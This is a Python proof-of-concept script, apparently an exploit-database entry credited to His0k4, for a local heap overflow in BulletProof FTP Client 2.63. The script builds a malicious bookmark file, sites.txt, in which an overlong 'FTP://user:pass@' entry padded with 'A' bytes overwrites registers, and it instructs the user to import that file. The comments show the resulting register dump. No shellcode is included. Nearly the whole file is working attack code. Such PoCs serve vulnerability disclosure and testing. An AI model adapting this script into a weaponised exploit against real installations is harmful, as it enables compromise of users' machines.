#!/usr/bin/python
#
#
#                  ------  |      ______ _____   (--, __*__  ______
#                  |____|  |      |    | |       | ! )  |    |     |
#                [ |    |` |      | <> | |-----> |__/   |    |     | ]
#                  | .. |  |____! |____| |____   |\     |    |-----|
#                                      |        _| \  -----  | ::: |
#                                      |         |  \
#                                |_____|         |   \
#                                                |
#                                                |
#                                               ,|.
#                                              / | \
#                                             |  |  |
#                                             |  _  |
#                                           `._\/.\/_,'
#                                             _( 8 )_
#                                            / '_ _' \
#                                           |  /{_}\  |
#                                           ` |  "  | `
#                                             |     |
#
#
# [+] Application :             BulletProof FTP (Client)  V2.63
#
# [+] Vendor URL :              http://www.bpftp.com/
#
# [+] Bug :                     BulletProof FTP Client Local Heap Overflow (PoC)
#
# [+] Author :                  His0k4
#
# [+] Greetings :               All friends & Muslims Hackers (dz)
#---------------------------------------------------------------------------------
# EAX 41414141
# ECX 016EC370
# EDX 00000000
# EBX 41414141
# ESP 0012F548
# EBP 0012F5C4 ASCII "AAAAAAAAAAAA"
# ESI 0170E70A ASCII "]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# EDI 0170E90A ASCII 03,"ftp"
# EIP 00596423 bpftpcli.00596423
#---------------------------------------------------------------------------------


header1 = "; This file was exported from BulletProof FTP Client vBulletProof FTP Client v2.63 (Build 56)\n"
header2 = "; Sitename=test site\n"
buff = "FTP://user:pass@" + "\x41" * 93


vuln = header1 + header2 + buff

try:
    out_file = open("sites.txt",'w')
    out_file.write(vuln)
    out_file.close()
    raw_input("\nBookmark file created!\n\nNow import the file and run it\n\nPress to exit...")
except:
    print "Error!"

# EoF
